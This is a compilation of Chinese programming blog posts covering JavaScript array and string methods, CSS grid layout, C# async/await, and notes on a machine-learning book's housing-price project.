从倒数第4项至倒数第2项（不包括倒数第2项）。"白"是倒数第1项。slice(a,b)取出了b-a项




 var arr = ["东","西","南","北","中","发","白"];
 var arr2 = arr.slice(-4,-2); //从下标倒数第四个开始，截取到倒数第二个
 console.log(arr2);   // ["北", "中"]




 




 var arr = ["东","西","南","北","中","发","白"];
 var arr2 = arr.slice(-4); //从下标倒数第四个开始，截取到后面全部的项
 console.log(arr2);   // ["北","中","发","白"]




 




 var arr1 = ["东","南","西","北","中","发","白"];
 //var arr2 = arr1.slice(3,1); //顺序错误
 var arr2 = arr1.slice(3,3);   //顺序错误
 console.log(arr2);//[] 空数组





2.3多功能splice()添加、删除、替换




 array.splice(index,howmany,item1,.....,itemX)

 



参数


描述




index


必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。




howmany


必需。要删除的项目数量。如果设置为 0，则不会删除项目。




item1, ..., itemX


可选。向数组添加的新项目。




返回值：




类型


描述




Array


包含被删除项目的新数组，如果有的话。




说明：
splice() 方法可删除从 index 处开始的零个或多个元素，并且用参数列表中声明的一个或多个值来替换那些被删除的元素。如果从数组对象中删除了元素，则返回的是含有被删除的元素的数组。
 
确定一件事：一旦应用，arr立即改变，并不需要重新赋值，换句话说，这个函数不返回新的数组。

//**************替换一些项**********
var arr = ["A","B","C","D","E","F","G"];
arr.splice(3,2,"苹果","香蕉"); //从数组下标3开始，删除两项，改为后替换的内容
console.log(arr);


 

//**************替换一些项**********
var arr = ["A","B","C","D","E","F","G"];
arr.splice(3,2,"苹果","香蕉","葡萄","橘子"); //从数组下标3开始，删除两项，插入4项
console.log(arr);


 

// **************更改一些项**********
var arr = ["A","B","C","D","E","F","G"];
arr.splice(2,4,"哈哈"); //从数组下标3开始，删除两项，插入1项
console.log(arr); //["A", "B", "哈哈", "G"]


 

// **************更改一个项**********
var arr = ["A","B","C","D","E","F","G"];
arr.splice(2,1,"哈哈"); //从数组下标3开始，删除两项，插入1项
console.log(arr); //["A", "B", "哈哈", "D", "E", "F", "G"]


 

//**************删除一些项**********
var arr = ["A","B","C","D","E","F","G"];
arr.splice(2,4); //没有东西可以替换，直接删除4项
console.log(arr); //["A", "B", "G"]


 

//**************插入一些项，但不删除**********
var arr = ["A","B","C","D","E","F","G"];
arr.splice(2,0,"嘻嘻","哈哈"); //从下标2开始插入2项，不删除
console.log(arr); //["A", "B", "嘻嘻", "哈哈", "C", "D", "E", "F", "G"]



 
splice依据参数的多少，和参数是什么，有多功能。现在你要能反应过来。
删除数组的最后5项。




 arr.pop();
 arr.pop();
 arr.pop();
 arr.pop();
 arr.pop();




简化为：




 for(var i = 1 ; i <= 5 ; i++){
  arr.pop();
 }




也可以：
 

var arr = ["A","B","C","D","E","F","G","H","I","J","K","L"];
//arr.splice(-5);
arr.splice(-5,5);         
console.log(arr);    


2.4倒序reverse();
reverse()方法就是立即让数组倒置：
 

var arr = ["A","B","C","D","E","F","G"];
arr.reverse();   //不需要赋值
console.log(arr);  //["G", "F", "E", "D", "C", "B", "A"]



2.5排序sort()
sort()方法排序

var arr = ["G","A","C","B","I","H","G","I","B"];
arr.sort();
console.log(arr);



//sort函数默认是按照字符顺序排的，隐式将数字转为string
//比字符编码顺序
var arr = [23,435,456,23,2,345,2,32,11,324,32,43,65,667,78,43];
arr.sort();
console.log(arr);


sort()里面有一个参数，这个参数是一个函数。
 

var arr = [41,4,52,64,99,66,88,77,100,412,78,43,2];
// 升序排序,从小到大
arr.sort(function(a,b){
    //如果a要放在b前面，那么return负数
    //如果a要放在b后面，那么return正数
    //如果a和b不区分大小，那么return 0
    if(a < b){
        return -1;  //满足第一个条件，返回值是-1，a要排在b前面
    }else if(a > b){
        return 1;   //满足第二个条件，返回值是1，a要排在b后面
    }else if(a == b){
        return 0;
    }
});
console.log(arr);


 
 
按五角星的个数排序:

var arr = ["★★★","★★★★★","★★","★","★★★★","★★★★","★★★★★★"];
arr.sort(function(a,b){
   // 若 a 小于 b，在排序后的数组中 a 应该出现在 b 之前，则返回一个小于 0 的值。
   // 若 a 等于 b，则返回 0。
   // 若 a 大于 b，则返回一个大于 0 的值。
   if(a < b){
       return -1; //满足第一个条件，返回值是-1，a在b前面
   }else if(a > b){
       return 1; //满足第二个条件，返回值是1，a在b后面
   }else if(a == b){
       return 0;
   }
});
console.log(arr);



 
2.6数组分割join()
join() 方法用于把数组中的值放入一个字符串，并且可以通过指定的分隔符进行分隔的。

var arr = [1,2,3,4,5,6,7];
var str = arr.join("★"); //转为字符串用新变量接收
console.log(str);


语法：




 var str = arr.join(分隔符);




 
如果不写分隔符，默认用逗号分割：




 var arr = [1,2,3,4,5,6,7];
 var str = arr.join();
 console.log(str);




 
 
如果是空字符串""就不分割：




 var arr = [1,2,3,4,5,6,7];
 var str = arr.join("");
 console.log(str);




 

三、字符串的属性和方法
3.1字符串属性
属性length就是字符串的长度




1 var str = "我们都非常喜欢JavaScript！希望能找到能带你*****飞的工作。";
1 console.log(str.length);




中文、数字、英语字母、空格、特殊符号，都算1个长度。

 
3.2字符串方法
3.2.1 charAt()查找字符串
返回字符串中指定下标位置的字符，下标从0开始




 //返回字符串中指定下标位置的字符，下标从0开始
 console.log("abcdef".charAt(0)) ;//a
 console.log("abcdef".charAt(2)) ;//a




 




 "abcdef".charAt(0);  
 "abcdef".charAt(2) ;//c




 和数组下标类似的。

var str = "abcdefg"
for(var i = 0 ; i < str.length ; i++){
    console.log(str.charAt(i));
}

 

 
3.2.2 indexOf()查找字符串下标
indexOf(检索的字符串,开始检索的位置)
返回某个指定的字符串值在字符串中首次出现的下标位置（索引值）。




 console.log(str.indexOf("非常喜欢"));




 
如果要检索的字符串值没有完全匹配的值，则该方法返回 -1。




console.log(str.indexOf("喜欢呀"));




 

3.2.3 lastIndexOf()
该方法可返回一个指定的字符串值最后出现的位置，在一个字符串中的指定位置从后向前搜索。




 console.log(str.lastIndexOf("的"));






3.2.4 replace()替换
该方法用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子串。




 "abcdefghijka".replace("a","苹果");//把a替换乘苹果，只替换一个




把a替换乘苹果，只替换一个。
 

 
3.2.5 split()字符串分割为数组
方法用于把字符串分割成数组（字符串→数组），从什么地方拆分，就是参数




 "我爱你亲爱的祖国的人民币".split("的");  




 




 1嘻嘻2嘻嘻3嘻嘻4嘻嘻5嘻嘻6".split("嘻嘻")




 

3.2.6 substr()提取字符串
方法可在字符串中抽取从 start 下标开始的指定数目的字符  
"字符串".substr(start,length)
start参数：开始下标，可以为正数，也可以为负数，-1最后一个，-2指倒数第二个，以此类推。
length参数：截取总长度。可以不写，直接截取到最后。
 

var str1 = str.substr(4,9); //从下标4开始，截取9个
var str2 = str.substr(-9,4);//从下标-9开始，截取4个
var str3 = str.substr(-9); //从下标-9开始，截取到最后
console.log(str1);
console.log(str2);
console.log(str3);



3.2.7 substring()提取字符串
方法用于提取字符串中介于两个指定下标之间的字符。
"字符串".substring(start,end); 不包括end，参数只能是正数，都是索引值。
截取时，从开始位置截取到结束位置，不包含结束位置。在选择开始位置之前，会先比较以下两个参数的大小，其中小的作为start值，大的作为stop。

var str = "我们都非常喜欢JavaScript！希望能找到能带你*****飞的工作。";
var str1 = str.substring(4,9);    //从下标4开始，截取到下标为9的位置(不包括结束)
// var str2 = str.substring(-9,4);//错误的，不能用负数
var str3 = str.substring(9,4);    //从下标4开始，截取到下标为9的位置(不包括结束)
var str4 = str.substring(4);     //从下标4开始，截取到最后
console.log(str1);
console.log(str3);
console.log(str4);



3.2.8 slice()字符串截取
方法可提取字符串的某个部分，并以新的字符串返回被提取的部分。（该方法在数组中学习过）
一个新的字符串。包括字符串 stringObject 从 start 开始（包括 start）到 end 结束（不包括 end）为止的所有字符。
 

var str = "我们都非常喜欢JavaScript！希望能找到能带你*****飞的工作。";
var str1 = str.slice(4,9);  //从下标4开始，截取到下标为9的位置(不包括结束)
var str2 = str.slice(-9,-4); //从下标-9开始，截取到下标为-4的位置(不包括结束)
var str3 = str.slice(3); //从下标3开始，截取到最后
console.log(str1);
console.log(str2);
console.log(str3);


三种截取方法的相同和不同点：




 


参数


参数正负


第二个参数




slice


正：开始和结束的下标
负：从后往前数
两个参数不能颠倒位置


可以为正，可以为负


可以不写




substring


开始和结束的下标
两个参数的大小，可以随意互换


只能是正数


可以不写




substr


第一个参数：是下标或者后面往前的位置
第二个参数：截取长度


第一个参数：可以为负或正


可以不写




substr和substring不一样：




 "我爱你亲爱的祖国的人民币".substr(6,2); //从下标6开始，截取2个字符









 "我爱你亲爱的祖国的人民币".substring(6,8);//从下标6开始截取到下标8




 

3.2.9 concat()字符串拼接
方法用于连接两个或多个数组或字符串。在数组方法中已经学习过。
 

//该方法没有改变原有字符串，但是会返回新字符串或数组
var str1 = "你好";
var str2 = "世界";
var str = str1.concat(str2);
console.log(str);//你好世界

该方法没有改变原有字符串，但是会返回新字符串或数组。

 
3.2.10大小写转换方法
toLowerCase() 方法用于把字符串转换为小写。
toUpperCase() 方法用于把字符串转换为大写。
不需要传递参数：将所有字符串中的字母进行大小写的转换




 "abcdefg".toUpperCase()
 "ABCDEFG".toLowerCase()




 

ps:尽量让它越来越规范，前期的文章都是本人的学习时的笔记整理，希望看完后可以指点一二，提提意见多多交流； 
笔记流程：html>css>javascript>jquery>html5/css3>移动端>ajax>面向对象>canvas>nodejs>es678>vue>react>小程序>面试问题
意见请留言，邮箱：scarf666@163.com
 
https://www.cnblogs.com/rope/p/10584670.html
**************************************************
grid网格系统布局

grid布局： 基于网格的2维布局方法1：display: grid | inline-grid | subgrid作用：启用网格grid容器
grid：定义一个块级的网格容器
inline-grid：定义一个内联的网格容器
subgrid：定义一个继承其父级网格容器的行和列的大小的网格容器，它是其父级网格容器的一个子项。

2:网格系统的属性（1）：grid-template-columns/grid-template-rowsgrid-template-columns 列宽(值得个数决定了列数)grid-template-rows 行高（值得个数决定了行数）设置方法：
a:
(创建三行三列的网格结构，值也可以设置auto自动分配剩余)
grid-template-columns:33.33% 33.33% 33.33%
grid-template-rows:33.33% 33.33% 33.33%

b:
repeat(3,33.33%)方法设置相同的值
grid-template-columns:repeat(3,33.33%)
grid-template-rows:repeat(3,33.33%)

c:
可以添加名称：
grid-template-columns:[line1] 25% [line2] auto [line3] 25% [line4]
grid-template-rows:[row1] 25% [row2] auto [row3] 25% [row4]

如图
d:
1fr 每个网格所占份数
grid-template-columns:1fr 1fr 1fr
grid-template-rows:1fr 1fr 1fr

（2）：grid-template-areas作用：grid-template-areas可以配合grid-area定义一个显式的网格区域。grid-template-areas定义网格区域，然后使用grid-area调用声明好的网格区域名称来放置对应的网格项目。 .代表一个空的网格单元例子：
<section>
    <div ></div>
    <div ></div>
    <div ></div>
    <div ></div>
</section>


section{
    display:grid;
    
    
    background:pink;
    grid-template-columns:repeat(4,1fr);
    grid-template-rows:(3,1fr);
    grid-template-areas: "header header header header"
    "nav . . aside"
    "footer footer footer footer"
}


.wrap1{
    grid-area: header;
    background:#f00;
}
.wrap2{
    grid-area: nav;
    background:#dd0;
}
.wrap3{
    grid-area: aside;
    background:#0dd;
}
.wrap4{
    grid-area: footer;
    background:#000;
}

效果如图：

（3）：grid-column-gap/grid-row-gap/grid-gap作用：指定网格线的大小，也可以说是网格子项之间的间距grid-gap是grid-column-gap和grid-row-gap的简称
eg:
grid-gap:10px

图示：
（4）：justify-items/align-items
属性值：
start：内容和网格区域的左边对齐
end：内容和网格区域的右边对齐
center：内容和网格区域的中间对齐
stretch：填充整个网格区域的宽度（默认值）

justify-items：让网格子项的内容和列轴对齐align-items：让网格子项的内容和行轴对齐，这个值对容器里面的所有网格子项都有用
eg:
justify-items: center;
align-items:center;

图示：
（4）justify-content/align-content属性值
start:左对齐
end：右对齐
center：居中对齐
stretch：填充网格容器
space-around：在每个网格子项中间放置均等的空间，在始末两端只有一半大小
space-between：两边对齐，在每个网格子项中间放置均等的空间，在始末两端没有空间
space-evenly：网格间隔相等，包括始末两端

说明：当网格子项非弹性单位，例如每个格子的宽是px单位，控制网格子项在网格系统里面的对齐方式。
justify-content 列网格线对齐

align-content 行网格线对齐

（5）grid-auto-columns/grid-auto-rows作用：设置隐式网格轨道的列宽和行高。
隐式网格：当你定位网格项超出网格容器范围时，将自动创建隐式网格轨道。怎么创建隐式网格：接触两个新属性（放在网格元素上） 》grid-column / grid-row
eg：grid-column ：2/3 把当前的元素放在第2列网格线开始到第三列网格线之间。gird-row：1/2 把当前元素放在第1行网格线开始到第2行网格线之间。
代码示例：
<section>
    <div >1</div>
    <div >2</div>
    <div >3</div>
</section>

section{
    
    
    background:pink;
    display:grid;
}
div{
    border:1px solid #d00;
}
.con1{
    grid-column: 2/3;
    grid-row: 2/3
}
.con2{
    grid-column: 6/7;
    grid-row: 1/2;
}
.con3{
    grid-column: 6/7;
    grid-row:2/3;
}


注：以上案例则创建了一个2行6列的网格系统。分别把网格内的元素放在网格不同的位置。（位置：类似几行几列 grid-column控制放在第几列，grid-row控制放在第几行）
grid-auto-columns/grid-auto-rows则是控制自动创建出来的网格的列宽和行高。eg:
grid-auto-columns: 60px;
grid-auto-rows:100px;


（5）grid-auto-flow:作用：当网格系统中没有设置网格内的元素固定在某个位置的时候，grid-auto-flow可以自动去排列位置：属性值：
row  按照行横向进行排列
column 按照列纵向进行排列
row dense 在行内按照元素的先后顺序进行排列
column dense  在列内按照元素的先后顺序排列

eg:
<section>
        <div>1</div>
        <div>2</div>
        <div>3</div>
        <div>4</div>
        <div>5</div>
        <div>6</div>
</section>

div:nth-child(2){
        grid-column:4/5;
        grid-row:2/3;
}

注:给第2个元素设置了位置。其他元素的排列按照grid-auto-flow设置进行排列。

（6）：justify-self/align-self
和justify-items/align-items的作用一样。区别：justify-items/align-items控制的是整个网格系统内的所用元素的对齐方式。而justify-self/align-self则是添加在网格系统中的某一个元素上面，仅对当前的元素起作用。


https://www.cnblogs.com/bruce-w/p/10584484.html
**************************************************
C#并发编程之异步编程(二)
写在前面
前面一篇文章介绍了异步编程的基本内容，同时也简要说明了async和await的一些用法。本篇文章将对async和await这两个关键字进行深入探讨，研究其中的运行机制，实现编码效率与运行效率的提升。

异步方法描述：使用async修饰符来标识一个方法或Lambda表达式的，被称之为异步方法。
异步方法编译：编译器在遇到await表达式后会截断方法，并将剩余的异步方法注册为在等待任务完成后需要继续执行的后续部分。



异步方法基础及其运行流程
Async和Await
异步方法使用async修饰，该方法包含一个或多个await表达式或语句，方法同步运行，直至到达第一个 Await，此时暂停，直到等待的任务完成，在任务完成后，控制权返回给方法的调用方。如果方法中并不包含await，则该方法不会像同步方法一样被挂起。
异步方法通常包含await运算符的一个或多个实例，但缺少await表达式也不会导致生成编译器错误，之会因为没有await而发出警告，但编译依然通过。
异步方法使用await关键字来确定等待位置，但await表达式并不阻止正在执行到此位置的线程，也就是说异步方法在await表达式执行时只是暂停，并不会导致方法退出，只会导致finally代码块不运行。异步方法只有在等待的任务完成后，才能通过该位置并继续执行剩下的逻辑，控制权也在此处返回给异步方法的调用方。
如果异步方法未使用Await运算符标记暂停点，那么异步方法会作为同步方法执行，即使有Async修饰符，也不例外。如以下示例

   1:  public async static Task<string> GetUserInfoAsync()
   2:  {
   3:      int i = await Task.FromResult(new Random().Next(1,100));//此处会挂起
   4:   
   5:      Task<int> j = Task.FromResult(new Random().Next(1, 100));//此处不会挂起，注意此处，返回值也变了，接下来会讨论一下异步方法的返回值
   6:   
   7:      return string.Empty;
   8:  } 
具MSDN描述，aysnc关键字是一个非保留的关键字。 在修饰方法或 lambda 表达式时，它是关键字，await也作为关键字存在。 在所有其他上下文中，async和await都会将其解释为标识符。不过开发人员可以不用太过关注这段，只需要知道aysnc会将一个方法标识成异步方法，而await可以挂起异步方法的执行即可。
<!--
.csharpcode, .csharpcode pre
{
	font-size: small;
	color: black;
	font-family: consolas, "Courier New", courier, monospace;
	background-color: #ffffff;
	/*white-space: pre;*/
}
.csharpcode pre { margin: 0em; }
.csharpcode .rem { color: #008000; }
.csharpcode .kwrd { color: #0000ff; }
.csharpcode .str { color: #006080; }
.csharpcode .op { color: #0000c0; }
.csharpcode .preproc { color: #cc6633; }
.csharpcode .asp { background-color: #ffff00; }
.csharpcode .html { color: #800000; }
.csharpcode .attr { color: #ff0000; }
.csharpcode .alt 
{
	background-color: #f4f4f4;
	width: 100%;
	margin: 0em;
}
.csharpcode .lnum { color: #606060; }
-->

关键点
1、和被async修饰的方法不一样，如果方法中含有await关键字，方法必须使用async标识符，否则编译不通过。
2、在异步编程过程中，比较推荐的做法是，被标记了async关键字的异步方法应该包含至少一个await表达式或语句。
3、异步方法的命名以Async结尾 



异步返回类型和异常处理
需要说明的是，本文所讨论的异步方法指的是基于任务的异步编程模型，返回值是，Task或Task<TResult>。
1、如果方法需要返回string类型，那么将返回Task<string>。如果方法没有指定返回类型，那么将返回Task。每个返回的任务都表示正在进行的工作，任务封装有关异步进程状态的信息，如果未成功，则会引发异常。异步方法返回 Task 或 Task<TResult>。 返回任务的属性携带有关其状态和历史记录的信息，如任务是否完成、异步方法是否导致异常或已取消以及最终结果是什么。 可使用await运算符访问这些属性。
 

   1:  public async static Task<string> GetUserInfo()
   2:  {
   3:      int i = await Task.FromResult(new Random().Next(1,100));
   4:   
   5:      return i % 2 == 0 ? "偶数" : "奇数";
   6:  }

2、如果等待的任务返回异步方法导致异常，则 await 运算符会以同步方式抛出异常。如果等待的返回任务的异步方法取消，await运算符引发OperationCanceledException。如果异步方法中没有使用await阻塞，可以使用try-catch捕捉异常，只是异常发生的时机可能会滞后。
异步方法的运行流程
了解异步方法的运行机制，就是要了解异步编程中的控制流是如何一步步执行的。如果需要详细了解控制流，可以异步到MSDN中查看。
下图及其描述摘自MSDN：


关系图中的数值对应于以下步骤。


事件处理程序调用并等待 AccessTheWebAsync 异步方法。


AccessTheWebAsync 创建HttpClient实例并调用GetStringAsync异步方法，获取的内容字符串方式返回。


GetStringAsync 中发生了某种情况，该情况挂起了它的进程。 可能必须等待其他阻止任务完成。 为避免阻止资源，GetStringAsync 会将控制权出让给其调用方 AccessTheWebAsync。 GetStringAsync 返回Task<TResult>，其中 TResult 为字符串，并且 AccessTheWebAsync 将任务分配给 getStringTask 变量。 该任务将调用GetStringAsync正在进行的进程，在调用完成时产生返回字符串给urlcontent。


由于尚未等待 getStringTask，因此，AccessTheWebAsync 可以继续执行而不依赖于 GetStringAsync 最终结果的完成。 该任务继续调用同步方法 DoIndependentWork。


DoIndependentWork 作为一个同步方法，在自身工作完成后返回到调用方。


AccessTheWebAsync 已运行完毕，可以不受 getStringTask 的结果影响。 接下来，AccessTheWebAsync 需要计算并返回已下载的字符串的长度，但该方法只有在获得字符串的情况下才能计算该值。
因此，AccessTheWebAsync 使用一个 await 运算符来挂起其任务，并把控制权交给调用 AccessTheWebAsync 的事件处理程序。 AccessTheWebAsync 将 Task<int>返回给调用方。 该任务将计算下载字符串长度。 


GetStringAsync 完成并生成一个字符串结果。 字符串结果不是通过按你预期的方式调用 GetStringAsync 所返回的。 （记住，该方法已返回步骤 3 中的一个任务）。相反，字符串结果存储在表示 getStringTask 方法完成的任务中。 await 运算符从 getStringTask 中检索结果。 赋值语句将检索到的结果赋给 urlContents。


当 AccessTheWebAsync 获取字符串结果时，该方法可以计算字符串长度。 然后，AccessTheWebAsync 工作也将完成，并且等待事件处理程序的继续使用。 事件处理程序也将最终获得字符串的长度信息。


注意： 
如果 GetStringAsync（因此 getStringTask）在 AccessTheWebAsync 等待前完成，则控制权会保留在 AccessTheWebAsync中。 如果异步调用过程 (AccessTheWebAsync) 已完成，并且 AccessTheWebSync 不必等待最终结果，则挂起然后返回到 getStringTask 将造成资源浪费。
在调用方内部（此示例中的事件处理程序），处理模式将继续。 在等待结果前，调用方可以开展不依赖于 AccessTheWebAsync 结果的其他工作，否则就需等待片刻。 事件处理程序等待 AccessTheWebAsync，而 AccessTheWebAsync 等待 GetStringAsync。

异步编程对性能的影响
在.NET异步编程中，async和await不会创建其他线程。同时异步方法不会在其自身线程上运行，因此它不需要多线程。只有当方法处于活动状态时，该方法将在当前同步上下文中运行并使用线程上的时间。可以使用Task.Run将占用大量CPU的工作移到后台线程，但是后台线程不会帮助正在等待结果的进程变为可用状态。
对于异步编程而言，基于异步的方法优于几乎每个用例中的现有方法。具体而言，这种方法优于BackgroundWorker的I/O绑定操作因为代码更简单且无需防止争用条件。结合Task.Run使用时，异步编程比BackgroundWorker更适用于CPU绑定的操作，因为异步编程将运行代码的协调细节与Task.Run传输至线程池的工作区分开来。
那么异步编程对线程的影响又是什么呢，相比大家应该都知道，ASP.NET中有两类线程，工作线程，和IO线程。
其中工作线程处理普通请求的线程，也是我们用得最多的线程。这个线程是有限的，是根CPU的个数相关的。IO线程，比如与文件读写，网络操作等是可以异步实现并且使性能提升的地方。I/O线程通常情况下是空闲的。所以可以使用IO线程来代替工作线程，一方面充分运用了系统资源，另一方面也节省了工作线程调度及切换所带来的损耗。
由此我们需要明白，在I/O密集型处理时，使用异步可以带来很大的提升，比如数据库操作以及网络操作。
即便异步编程带来性能的提升，但是运用不慎，也会对系统性能产生反作用，比如直接使用Task.Run或者Task.Factory.StartNew所带来的异步编程，这些方式会占用工作线程以及工作线程之间的切换。
异步编程需要注意的地方

1、同时async和await侵入性或者传递性很强，所有调用的地方都需要同步使用async和await，这对系统中老代码的修改产生了很大的影响。
2、异步编程中无法使用lock锁，因为异步方法不会在自身线程上运行，lock就变成了多余的了。但异步编程场景下可以使用AsyncLock锁，对相应的代码进行锁定。
3、异步编程里，比较推荐的做法是避免上线文延续，此处不再做更多说明，参考我的前一篇文章《异步编程（一）》
4、异步编程是否真的提升了系统性能，目前来看大多数场景下是提升了，尤其在I/O操作比较密集的业务场景下，比如查询数据库和HttpClient调用。



https://www.cnblogs.com/edison0621/p/10584279.html
**************************************************
《机器学习实战（基于scikit-learn和TensorFlow）》第二章内容的学习心得
 
请支持正版图书， 购买链接
下方内容里面很多链接需要我们科学上网，请大家自备梯子，实在不会再请留言，节约彼此时间。
当开始着手进行一个端到端的机器学习项目，大致需要以下几个步骤：

观察大局
分析业务，确定工作方向与性能指标
获得数据
借助框架分析数据
机器学习算法的数据准备
选择和训练模型
微调模型
展示解决方案
启动、监控和维护系统

接下来，我将对每一个部分自己的心得进行总结。
 
一、观察大局
当开始一个真实机器学习项目时，需要针对项目的特点，有针对性进行分析。任何项目都有其最终的目的，总的说来，我觉得首先要考虑的是业务需求，即用这个模型要解决什么事情，需要的程度如何等等的问题。假设项目是一个预测的问题，那么我需要知道的是我上游环节能给我什么样的数据，下游的环节需要我提供怎样的数据流，是具体的价格（要精确到何种地步？）？还是一个等级划分？这些都决定了自己在这个项目上所花费的精力以及使用的模型、测量方法等一系列问题，总之要求不一样，进行的处理就不一样，这就是大局观。
二、分析业务，确定工作方向与性能指标
因为我们是要进行机器学习项目，所以应该根据业务对我们的项目要构造的机器学习系统的种类进行划分。从长远来看，机器学习系统大致有以下几种：

是否在人类监督下训练：监督式学习、无监督学习、半监督学习与强化学习
是否可以动态地进行增量学习：在线学习和批量学习
是简单地将新的数据点和已知的数据点进行匹配，还是对训练的数据进行有针对性的模型预测：基于实例的学习与基于模型的学习

这里，以文中的”房价预测“为例。
1、分析机器学习系统的类别
这里可以先提前给出部分数据，如下图。让我们来思考一下，这个预测问题应该划分为什么类别。

我们可以看到，图中数据有很多属性，由于我们最终做的是房价预测而数据中你会发现有一列属性很耀眼”median_house_value“，这个属性是该地区的房价中位数属性，那我就明白了一件事，那就是我要预测的结果应该与该地区的房价中位数差不多才是正确的预测结果，所以我的机器学习系统应该是一个有监督的学习系统，是一个多变量回归的问题。
2、测试指标的选择
因为已经确定了是一个对变量的回归问题，因此测试指标就应该对应多变量回归问题进行。
回归问题的典型性能衡量指标首选是均方根误差(RMSE)，这里首先给出它的公式供大家参考：

 
 
注：其中的m是数据集实例中的实例数量，x是数据集中所有实例的所有特征值的矩阵，h(x)为系统的预测函数，即我们要预测的结果，y为真实值。
上式的意思就是描述预测值与真实值之间的差异，RMSE的值越小，说明预测效果越好，预测值与真实值的偏差越小。
(这里附一个链接，关于讲解均方根误差、标准差、方差之间的关系。总的说来，标准差是数据序列与均值的关系，而均方根误差是数据序列与真实值之间的关系。因此，标准差是用来衡量一组数自身的离散程度，而均方根误差是用来衡量观测值同真值之间的偏差，它们的研究对象和研究目的不同，但是计算过程类似)
如果获得的数据中存在许多的离群区域，我们可以考虑用平均绝对误差(MAE)，这里给出公式：

这个公式可以很好的解决偏离抵消的情况，真实反映出预测值与真实值的偏差，当然MAE的值越小越好。
上述两个公式相比，我们可以发现，RMSE对异常值更加敏感，因为当出现一个较大的偏差的异常值时，会极大影响结果的数值，MAE则影响相对小。
所以，RMSE更加适合数据分布为钟形的曲线(类似正态分布)的情况，而MAE更加适合数据偏离散的情况。
三、获得数据
我的建议是要获取真实的数据进行操作。书中列出了很多的开源数据：

流行的开放数据存储库：

— UC Irvine Machine Learning Repository
— Kaggle datasets
— Amazon’s AWS datasets

源门户站点(他们会列出很多开放的数据库):

— http://dataportals.org/
— http://opendatamonitor.eu/
— http://quandl.com/

其他的一些许多流行的开放数据库页面：

— Wikipedia’s list of Machine Learning datasets
— Quora.com question
— Datasets subreddit
这里开放的数据许多是国外数据库，访问需要科学上网，如急切需要但不知如何科学上网，请与我联系（nfuquan AT gmail.com）
以后会更新更多的关于我们中文的数据库，尽情期待。
 
四、借助框架分析数据
用Anaconda组件中的Jupyter Notebook说明，编程语言为python3.5。
1、Pandas
具体它的功能就不去介绍了，可以附一个链接，自行查看。
这里集中说明几个函数的功能，方便以后自己能快速查看。

pandas.DataFrames.head()

这个函数是读取DataFrames格式数据，默认读取5个元素，当然可以在参数中传递自己想读取的函数的个数。


pandas.DataFrames.info()

这个函数是列出DataFrames格式中的索引信息、行信息、非空值信息以及内存使用信息,这个函数可以清楚地告诉我们数据的异常状态，从而让我们在数值上进行处理。


pandas.DataFrames.describe()

这个函数显示数据的各个属性摘要，同时针对数值数据进行了数据的一些计算。


pandas.DataFrames[“属性”].value_counts()

这个函数是对属性中的内容进行统计。


pandas.DataFrames.hist()

首先应该在首行加入%matplotlib inline (该式只能在jupyter notebook中使用，意思是直接编译显示结果)。
这个函数是将数据每个属性制作为一个直方图。有很多的参数，具体请查看链接


上述函数给我们一个极大的便利就是针对数据的具体情况可以进行逐个分析。例如，我们可以看到收入中位数“median_income”最大值为15，这个不符合常识，收入因该至少在五位数才对，因此需要针对该数据对数据提供方进行询问，经询问，得知该属性进行了属性的缩放。在直方图中，我们一般应该注意的方面是数据的范围以及数量、分布，为什么要关注这些呢，因为要结合实际。举个例子，比如我们发现房屋价格的中位数最大到50万美元，而且数量很多，而且根据数据的分布，感觉存在异常，如果对数据敏感的话，我们应该有这样的疑问:是否这个数据是一个限制条件，就是说将这个数据以上的数据全部都设置为50万，这会导致我们的学习算法永远不会估计出超过50万元的数值，这个结果是否可接受，需要考虑。如果要求是可以预测出50万元以上的房屋价格，我们可以针对50万以上的房屋价格重新收集数据或者除去50万元以上的数据，同时允许我们的机器学习算法预测出50万元以上的结果。直方图还表现了一个特征是有几个属性值分布不均匀，有可能会影响机器学习系统难以预测的某些模式。
书中介绍了一个典型偏误“数据窥探偏误”，这里先解释一下:人脑容易过度匹配，当发现某些数据模式有特征时，可能就会只训练某些有特征的数据，而这些数据很有可能不代表普遍规则，如果机器学习算法采用这些数据做训练，就会导致结果可能很好，但是在预测实际内容时，会缺乏泛化能力。我们需要科学的数据划分！
数据集划分：训练集(训练+验证)、测试集
假设数据量较大5000-10000内，可以用随机选择的方式，按照训练80%，测试20%进行分布。假设数据量在100000以上，可以考虑将训练集的比例增加，测试集比例降低。如果数据很少，则随机选择数据划分可能存在问题，要按照一定规则分布的规律中进行抽样选择。以房屋价格预测为例，预测的价格与人们的收入中位数属性密切相关，因此我们应该以收入中位数的属性特征进行样本的划分:

上图是收入中位数数据，我们可以看出，收入在2-4人数比较多，同时看出基本上在收入上是一个连续的分布，不能进行一个分层的抽样，因此，我们应该将上述数据进行一个划分，分成5类或者6类(这个分类可以自己定)。
操作步骤：1、使用numpy框架的ceil()函数进行取整操作 
              2、然后使用where()函数，将取整后的类别值大于5的类别统一归为类别

上述操作我们获得了一个分类标签属性“income_cat”，注意这个标签只是为了区别各个数据的收入中位数类别，因此这个标签可以在使用完毕之后进行删除。
使用sklearn框架中的Stratified-Shuffle Split类可以进行分层抽样。

上面的语句的意思是首先对需要分层的类别进行一个预设置，然后通过一个for循环按照数据中的“income_cat”属性中的分层情况进行划分，得出分布一样训练集和测试集。具体的类别怎么操作，请查阅链接
使用pandas.DataFrame中的drop()可以将函数中的某个属性进行删除，因此我们在使用完“income_cat”后在测试集中与训练集中将该属性删除:

至此，我们按照科学的方式对数据进行了划分，使得测试集与训练集的分布一致，这是一个合理科学的划分方式。
当我们将测试集与训练集划分好后，测试集不宜改动，我们应该重点关注训练集，并从中获取更多的易于构建我们机器学习系统的信息。
训练集的探索：
首先，创建一个训练集副本！任何探索都不能改变原始数据集合，应该创建副本，在副本上进行探索！使用copy()函数进行拷贝。

还是回归到数据集的属性上，“longitiude”与“latitude”是经纬度，这个数据是不会变的，相比其他的数据来说，这个数据在显示上更容易，因此我们可以对该数据进行可视化操作。
plot()函数是绘图函数，具体的介绍，请看链接


在上述函数中有个属性是alpha，改变该值，可以提高显示图像的疏密程度，这对于我们的数据探索有帮助，因此:

可以看出，沿海的房屋数据更多，内陆的房屋数据较少些，沿海地区中也存在集中现象。
在此基础上，我们将房价信息添加到上图中。
使用jet的一个预定义的颜色表表示房屋价值，每个园的半径显示出该地区人口数量：

